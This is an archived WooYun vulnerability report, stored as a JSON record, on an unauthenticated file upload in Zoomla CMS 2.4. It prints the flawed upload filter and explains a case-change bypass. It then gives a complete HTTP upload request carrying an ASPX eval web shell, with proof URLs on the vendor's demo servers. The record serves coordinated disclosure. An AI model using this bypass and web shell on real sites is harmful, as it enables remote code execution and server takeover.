{"id": 65876, "wybug_id": "wooyun-2015-0125982", "wybug_title": "逐浪cms 2.4某处任意文件上传（不需要登录）", "wybug_corp": "逐浪CMS", "wybug_author": "1c3z", "wybug_date": "2015-07-10 20:47", "wybug_open_date": "2015-10-13 09:54", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件上传", "代码审核"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-10：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-15：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-07-18：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-09-08：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-18：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-28：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-13：\t细节向公众公开  简要描述： 有防御，但是可以绕过 详细说明：  /Plugins/swfFileUpload/UploadHandler.ashx 有一个全局过滤\n\nasp_code.dllclass ZoomlaSecurityCenter\npublic static void CheckUpladFiles()\t{\t\tHttpRequest request = HttpContext.Current.Request;\t\tHttpResponse response = HttpContext.Current.Response;\t\tif (HttpContext.Current.Request.ContentType.IndexOf(\"multipart/form-data\") > -1)\t\t{\t\t\tHttpFileCollection files = request.Files;\t\t\tfor (int i = 0; i < files.Count; i++)\t\t\t{\t\t\t\tHttpPostedFile httpPostedFile = files[i];\t\t\t\tstring fileName = httpPostedFile.FileName;\t\t\t\tif (httpPostedFile.ContentLength > 0)\t\t\t\t{\t\t\t\t\tif (fileName.IndexOf(\".\") > -1)\t\t\t\t\t{\t\t\t\t\t\tstring[] array = fileName.Split(new char[]\t\t\t\t\t\t{\t\t\t\t\t\t\t'.'\t\t\t\t\t\t});\t\t\t\t\t\tfor (int j = 1; j < array.Length; j++)\t\t\t\t\t\t{\t\t\t\t\t\t\tstring ext = array[j].ToString().ToLower();\t\t\t\t\t\t\tif (!ZoomlaSecurityCenter.ExNameCheck(ext))\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\tstring findStr = System.IO.Path.GetExtension(fileName).ToLower().Replace(\".\", \"\");\t\t\t\t\t\t\t\tstring text = SiteConfig.SiteOption.UploadFileExts.ToLower();\t\t\t\t\t\t\t\tif (!StringHelper.FoundCharInArr(text, findStr, \"|\"))\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\tfunction.WriteErrMsg(\"上传的文件不是符合扩展名\" + text + \"的文件\");\t\t\t\t\t\t\t\t\tresponse.End();\t\t\t\t\t\t\t\t}\t\t\t\t\t\t\t}\t\t\t\t\t\t\telse\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\tfunction.WriteErrMsg(\"请勿上传可疑文件！\");\t\t\t\t\t\t\t\tresponse.End();\t\t\t\t\t\t\t}\t\t\t\t\t\t}\t\t\t\t\t}\t\t\t\t\telse\t\t\t\t\t{\t\t\t\t\t\tfunction.WriteErrMsg(\"请勿上传可疑文件！\");\t\t\t\t\t\tresponse.End();\t\t\t\t\t}\t\t\t\t}\t\t\t}\t\t}\t}\n将multipart/form-data的大小写改下就可以绕过了局部过滤可以改文件后缀名大小写绕过\nPOST /Plugins/swfFileUpload/UploadHandler.ashx HTTP/1.1Host: demo.zoomla.cnContent-Length: 263Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: nullUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/43.0.2357.81 Chrome/43.0.2357.81 Safari/537.36Content-Type: Multipart/form-data; boundary=----WebKitFormBoundaryNyS0P5wwqaOrCYshAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8Cookie: ASP.NET_SessionId=gwezhhqzegfs5nhcpdeaso5s; bdshare_firstime=1436497685958; jiathis_rdc=%7B%22http%3A//www.zoomla.cn/down/2407.shtml%22%3A%220%7C1436497760852%22%7D; hasshown=1------WebKitFormBoundaryNyS0P5wwqaOrCYshContent-Disposition: form-data; name=\"Filedata\"; filename=\"name.Aspx\"Content-Type: application/x-aspx<%@ Page Language=\"Jscript\"%><%eval(Request.Item[\"zsd\"],\"unsafe\");%>------WebKitFormBoundaryNyS0P5wwqaOrCYsh--\n   漏洞证明：  http://www.zoomla.cn/uploadfiles/2015/7/10/201507101729516640188.Aspx?zsd=Response.Write(%22wooyun%22);http://demo.zoomla.cn/uploadfiles/2015/7/10/201507101729537310808.Aspx?zsd=Response.Write(%22wooyun%22);   修复方案：  ！！   版权声明：转载请注明来源 1c3z@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2015-07-15 09:52 厂商回复： 感谢反馈！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-07-10 20:54 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  给力    \n     2015-07-10 22:40 |    \t\t从容 \t\t\t( 普通白帽子  |\t\t\t        Rank:221 漏洞数:75        | Enjoy Hacking Just Because It's Fun :)  ...)\t\t \n  @wefgod 经典的口头禅    \n     2015-07-11 02:15 |    \t\t乌云首席鉴黄师 \t\t\t( 普通白帽子  |\t\t\t        Rank:131 漏洞数:55        | 妈妈，我要上电视)\t\t \n  坐等忽略    \n     2015-07-12 10:20 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @从容 很给力，多一个字    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}